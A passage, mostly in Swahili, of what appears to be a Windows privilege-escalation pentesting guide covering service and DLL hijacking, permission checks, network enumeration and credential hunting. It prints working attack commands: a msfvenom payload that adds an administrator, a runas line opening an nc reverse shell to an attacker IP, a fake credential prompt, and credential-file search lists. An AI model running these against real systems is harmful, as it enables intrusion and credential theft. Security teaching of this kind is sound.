**Unaweza kugundua na kutumia** udhaifu huu na metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kiwango cha huduma kwa mkono na metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Kurejesha

Windows inaruhusu watumiaji kuteua hatua zitakazochukuliwa ikiwa huduma inashindwa. Kipengele hiki kinaweza kusanidiwa kuashiria kwa faili ya binary. Ikiwa binary hii inaweza kubadilishwa, inawezekana kufanya ukuaji wa mamlaka. Maelezo zaidi yanaweza kupatikana katika [hati rasmi](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Matumizi

### Matumizi Yaliyosakinishwa

Angalia **ruhusa za binaries** (labda unaweza kubadilisha moja na kupandisha mamlaka) na **folda** ([DLL Hijacking](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Uandishi wa Ruhusa

Angalia ikiwa unaweza kuhariri faili ya usanidi ili kusoma faili maalum au ikiwa unaweza kuhariri programu ya binary ambayo itatekelezwa na akaunti ya Msimamizi (schedtasks).

Njia ya kupata ruhusa dhaifu za folda/faili katika mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Kukimbia wakati wa kuanza

**Angalia kama unaweza kubadilisha usajili au faili fulani ambayo itatekelezwa na mtumiaji tofauti.**\
**Soma** ukurasa **ifuatayo** ili kujifunza zaidi kuhusu maeneo ya kuvutia ya **kukimbia kwa mamlaka ya ziada**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Madereva

Tafuta **madereva ya tatu ya ajabu/hatarishi** yanayowezekana
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Ikiwa una **ruhusa ya kuandika ndani ya folda iliyopo kwenye PATH** unaweza kuweza kuteka DLL inayopakiwa na mchakato na **kupandisha vyeo**.

Angalia ruhusa za folda zote kwenye PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa habari zaidi kuhusu jinsi ya kutumia ukaguzi huu:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Mtandao

### Hisa
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### faili ya wenyeji

Angalia kompyuta zingine zinazojulikana zilizowekwa kwa nguvu kwenye faili ya wenyeji
```
type C:\Windows\System32\drivers\etc\hosts
```
### Vifaa vya Mtandao & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Viokelea Wazi

Angalia **huduma zilizozuiwa** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Mwongozo
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Mipangilio ya Kizuizi cha Moto

[**Angalia ukurasa huu kwa amri zinazohusiana na Kizuizi cha Moto**](../basic-cmd-for-pentesters.md#firewall) **(orodha ya sheria, tengeneza sheria, zima, zima...)**

Zaidi[ amri za uchambuzi wa mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ikiwa unapata mtumiaji wa mzizi unaweza kusikiliza kwenye bandari yoyote (wakati wa kwanza unapotumia `nc.exe` kusikiliza kwenye bandari itauliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Kuanza bash kama root kwa urahisi, unaweza jaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Sifa za Windows

### Sifa za Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Meneja wa Vyeti / Hazina ya Windows

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Hazina ya Windows inahifadhi sifa za mtumiaji kwa seva, tovuti, na programu zingine ambazo **Windows** inaweza **kuingia kiotomatiki** kwa watumiaji. Kwa mara ya kwanza, hii inaweza kuonekana kama watumiaji wanaweza kuhifadhi sifa zao za Facebook, Twitter, Gmail nk., ili wajiunge kiotomatiki kupitia vivinjari. Lakini sivyo.

Hazina ya Windows inahifadhi sifa ambazo Windows inaweza kuingia kiotomatiki kwa watumiaji, ambayo inamaanisha kwamba **programu yoyote ya Windows inayohitaji sifa za kupata rasilimali** (seva au tovuti) **inaweza kutumia Meneja wa Sifa** & Hazina ya Windows na kutumia sifa zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nywila kila wakati.

Isipokuwa programu zinashirikiana na Meneja wa Sifa, nadhani haiwezekani kwao kutumia sifa kwa rasilimali iliyopewa. Kwa hivyo, ikiwa programu yako inataka kutumia hazina, inapaswa kwa njia fulani **kuwasiliana na meneja wa sifa na kuomba sifa za rasilimali hiyo** kutoka kwenye hazina ya kuhifadhi ya msingi.

Tumia `cmdkey` kuorodhesha sifa zilizohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` na chaguo la `/savecred` ili kutumia sifa zilizohifadhiwa. Mfano ufuatao unaita faili ya mbali kupitia sehemu ya SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya mibofyo iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Tafadhali kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), au kutoka [Moduli ya Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya kifungashaji wa data kwa kutumia encryption ya symmetric, hasa hutumiwa ndani ya mfumo wa uendeshaji wa Windows kwa encryption ya symmetric ya private keys za asymmetric. Encryption hii hutumia siri ya mtumiaji au mfumo kuchangia kwa kiwango kikubwa cha entropy.

**DPAPI inawezesha encryption ya keys kupitia muhimu wa symmetric ambao unatokana na siri za kuingia za mtumiaji**. Katika mazingira yanayohusisha encryption ya mfumo, inatumia siri za uthibitishaji wa kikoa cha mfumo.

Keys za RSA za mtumiaji zilizo encrypted, kwa kutumia DPAPI, hifadhiwa katika directory ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security\_Identifier) ya mtumiaji. **Muhiu wa DPAPI, ulio katika faili ileile inayolinda private keys za mtumiaji, kwa kawaida unajumuisha 64 bytes za data ya nasibu. (Ni muhimu kufahamu kwamba upatikanaji wa directory hii umefungwa, kuzuia orodha ya maudhui yake kupitia amri ya `dir` katika CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).**
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **moduli ya mimikatz** `dpapi::masterkey` pamoja na hoja sahihi (`/pvk` au `/rpc`) kuidondoa.

**Faili za siri zilizolindwa na nenosiri kuu** kawaida hupatikana katika:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **moduli ya mimikatz** `dpapi::cred` na `/masterkey` sahihi kufichua.\
Unaweza **kuchimbua DPAPI nyingi** **masterkeys** kutoka **kumbukumbu** kwa kutumia moduli ya `sekurlsa::dpapi` (ikiwa wewe ni root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Sifa za PowerShell

**Sifa za PowerShell** mara nyingi hutumiwa kwa **scripting** na kazi za kiotomatiki kama njia ya kuhifadhi sifa zilizofichwa kwa urahisi. Sifa hizo zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida inamaanisha zinaweza kufichuliwa tu na mtumiaji huyo huyo kwenye kompyuta ile ile zilizoundwa.

Kufichua sifa za PS kutoka kwenye faili inayozihifadhi unaweza kufanya hivi:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Umeunganishwa kwa Mbali wa RDP Uliohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Vitambulisho vya Kijijini**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia moduli ya **Mimikatz** `dpapi::rdg` na `/masterkey` sahihi kwa **kusakinisha faili za .rdg**\
Unaweza **kutoa manyege ya DPAPI** kutoka kumbukumbu na moduli ya Mimikatz `sekurlsa::dpapi`

### Noti za Kukumbuka

Watu mara nyingi hutumia programu ya StickyNotes kwenye vituo vya kazi vya Windows kwa **kuhifadhi nywila** na habari nyingine, bila kufahamu kuwa ni faili ya database. Faili hii iko kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na ni vyema kuitafuta na kuichunguza.

### AppCmd.exe

**Tafadhali kumbuka kuwa ili kupata nywila kutoka kwa AppCmd.exe unahitaji kuwa Msimamizi na kukimbia chini ya kiwango cha Juu cha Uadilifu.**\
**AppCmd.exe** iko katika saraka ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, basi kuna uwezekano kwamba baadhi ya **manyege** yameboreshwa na yanaweza **kupatikana**.

Msimbo huu ulichimbuliwa kutoka kwenye [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia ikiwa `C:\Windows\CCM\SCClient.exe` ipo.\
Wakala wa kusakinisha **hufanywa na mamlaka ya SYSTEM**, wengi wao ni dhaifu kwa **DLL Sideloading (Maelezo kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Usajili (Siri)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Funguo za Mwenyeji wa SSH za Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Funguo za SSH kwenye rejista

Funguo za kibinafsi za SSH zinaweza kuhifadhiwa ndani ya funguo la rejista `HKCU\Software\OpenSSH\Agent\Keys` kwa hivyo unapaswa kuangalia ikiwa kuna kitu cha kuvutia ndani ya hapo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

If `ssh-agent` service is not running and you want it to automatically start on boot run:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Inaonekana kama hii mbinu si halali tena. Nilijaribu kuunda baadhi ya funguo za ssh, kuziweka kwa kutumia `ssh-add` na kuingia kupitia ssh kwenye mashine. Usajili HKCU\Software\OpenSSH\Agent\Keys haupo na procmon haikubaini matumizi ya `dpapi.dll` wakati wa uthibitishaji wa funguo za asymmetric.
{% endhint %}

### Faili zisizohitaji kuingiliwa
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum\_unattend_

Mfano wa maudhui:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Nakala za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vyeti vya Wingu
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Cached GPP Pasword

Kipengele kilikuwepo hapo awali ambacho kiliruhusu kupeleka akaunti za wasimamizi wa mitaa kwenye kikundi cha mashine kupitia Mapendeleo ya Sera ya Kikundi (GPP). Hata hivyo, njia hii ilikuwa na dosari kubwa za usalama. Kwanza, Vitu vya Sera ya Kikundi (GPOs), vilivyohifadhiwa kama faili za XML katika SYSVOL, vilikuwa vinaweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, nywila ndani ya hizi GPPs, zilizoandikwa kwa AES256 kwa kutumia ufunguo wa chaguo-msingi ulioelezewa hadharani, zingeweza kufunguliwa na mtumiaji yeyote aliyeidhinishwa. Hii ilileta hatari kubwa, kwani ingeweza kuruhusu watumiaji kupata mamlaka ya juu.

Ili kupunguza hatari hii, kazi ilibuniwa ili kutafuta faili za GPP zilizohifadhiwa kienyeji zikiwa na uga wa "cpassword" ambao si tupu. Kwa kupata faili kama hiyo, kazi hufungua nywila na kurudisha kitu cha PowerShell cha desturi. Kitu hiki kinajumuisha maelezo kuhusu GPP na eneo la faili, kusaidia katika kutambua na kurekebisha dosari hii ya usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa faili hizi:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Kufungua cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata nywila:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Mipangilio ya Wavuti ya IIS
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config na siri:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Maelezo ya OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Kumbukumbu
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Uliza kwa siri za kibali

Unaweza **kuomba mtumiaji aingize siri zake au hata siri za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (tambua kwamba **kuuliza** moja kwa moja kwa **mteja** kuhusu **siri** ni hatari sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Jina la faili linalowezekana lenye siri**

Faili zinazojulikana ambazo kwa wakati fulani zilikuwa na **maneno ya siri** kwa **maandishi wazi** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Tafuta faili zote zilizopendekezwa:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Vitambulisho katika RecycleBin

Unapaswa pia kuangalia Bin kutafuta vitambulisho ndani yake

Kwa **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Ndani ya rejista

**Vitufe vingine vya rejista vinavyowezekana na vitambulisho**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Chimbua funguo za openssh kutoka kwenye usajili.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia kwenye dbs ambapo nywila kutoka **Chrome au Firefox** zimehifadhiwa.\
Pia angalia historia, alamisho na vipendwa vya vivinjari ili labda baadhi ya **nywila zimehifadhiwa** hapo.

Vyombo vya kuchimbua nywila kutoka kwenye vivinjari:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Uandishi wa COM DLL**

**Modeli ya Vitu vya Component (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu **mawasiliano** kati ya vipengele vya programu za lugha tofauti. Kila kipengele cha COM kina **tambulisho kupitia kitambulisho cha darasa (CLSID)** na kila kipengele hutoa utendaji kupitia moja au zaidi ya viunganishi, vilivyotambuliwa kupitia kitambulisho cha viunganishi (IIDs).

Darasa na viunganishi vya COM vimefafanuliwa kwenye usajili chini ya **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na **HKEY\_**_**CLASSES\_**_**ROOT\Interface** mtawalia. Usajili huu unajengwa kwa kuunganisha **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Ndani ya CLSIDs ya usajili huu unaweza kupata usajili wa watoto **InProcServer32** ambao una thamani ya **msingi** inayoashiria kwenye **DLL** na thamani inayoitwa **ThreadingModel** inayoweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

